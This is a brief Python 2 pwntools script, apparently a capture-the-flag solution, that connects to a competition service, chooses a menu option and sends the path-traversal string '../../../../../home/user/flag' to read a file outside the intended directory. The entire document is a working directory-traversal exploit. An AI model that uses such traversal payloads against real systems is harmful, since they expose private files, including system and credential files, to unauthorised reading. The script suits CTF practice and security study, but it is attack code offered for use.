#! /usr/bin/env python2

from pwn import *

host = 'mngmnt-iface.ctfcompetition.com'
port = 1337

s = remote(host,port)
s.recv()
s.recv()
s.sendline("2")
s.recv()
s.recv()
s.sendline("../../../../../home/user/flag")
print s.recv()
print s.recv()
s.close()


